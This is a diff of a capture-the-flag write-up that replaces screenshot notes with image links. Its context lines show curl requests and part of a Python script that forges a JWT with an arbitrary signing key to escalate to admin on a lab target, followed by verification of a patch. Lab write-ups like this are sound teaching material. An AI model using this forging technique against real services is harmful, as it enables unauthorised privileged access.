@@ -29,8 +29,7 @@ the server accept an entirely self-signed, self-asserted admin token.
 curl -s http://<target>:8008/api/token | jq
 ```
 
-> 📸 **Screenshot:** terminal output of `/api/token`, showing the
-> issued JWT.
+![screenshot](1.png)
 
 Decode it (jwt.io or any JWT decoder) and inspect the header and
 payload:
@@ -43,8 +42,7 @@ payload:
   "iss": "Internal Auth API", "aud": "employee-portal", "exp": ... }
 ```
 
-> 📸 **Screenshot:** jwt.io (or decoder of choice) showing the decoded
-> header and payload of the baseline employee token.
+![screenshot](2.png)
 
 **Step 2 — Confirm the obvious attempt fails.**
 
@@ -57,8 +55,7 @@ curl -s -H "Authorization: Bearer $EMP" http://<target>:8008/api/admin/flag
 {"message":"Insufficient privileges"}  (403)
 ```
 
-> 📸 **Screenshot:** terminal showing the `403 Insufficient
-> privileges` response for the normal employee token.
+![screenshot](3.png)
 
 A valid, correctly-signed employee token with `role: employee` is
 rejected by the admin endpoint, as expected.
@@ -85,9 +82,7 @@ print(jwt.encode(payload, "any-key-you-like", algorithm="HS256", headers=headers
 EOF
 ```
 
-> 📸 **Screenshot:** terminal showing the forged token being printed.
-> Note the signing key is arbitrary (`"any-key-you-like"`) — the
-> server will never check it.
+![screenshot](4.png)
 
 **Step 4 — Submit the forged token.**
 
@@ -102,9 +97,7 @@ curl -s -H "Authorization: Bearer $FORGED" http://<target>:8008/api/admin/flag
 {"flag":"HS{jwt_legacy_header_claim_escalation}","message":"Administrator authenticated"}
 ```
 
-> 📸 **Screenshot:** terminal showing the forged-token request and the
-> JSON response with the `flag` field visible (redact or crop the
-> flag if this writeup will be shared before the event retires).
+![screenshot](5.png)
 
 ---
 
@@ -172,14 +165,8 @@ Every token — regardless of its `typ` claim — now goes through
 
 1. Re-run Step 3/4 above → should now return `401 Invalid token`.
 
-   > 📸 **Screenshot:** terminal showing the `401 Invalid token`
-   > response for the same forged token after the patch.
-
 2. Confirm legitimate flows still work: `/api/token` → `/api/verify`
    should still return `"valid": true` for a normal employee token.
-
-   > 📸 **Screenshot:** terminal showing a normal employee token still
-   > passing `/api/verify` after the patch.
 
 ---
 
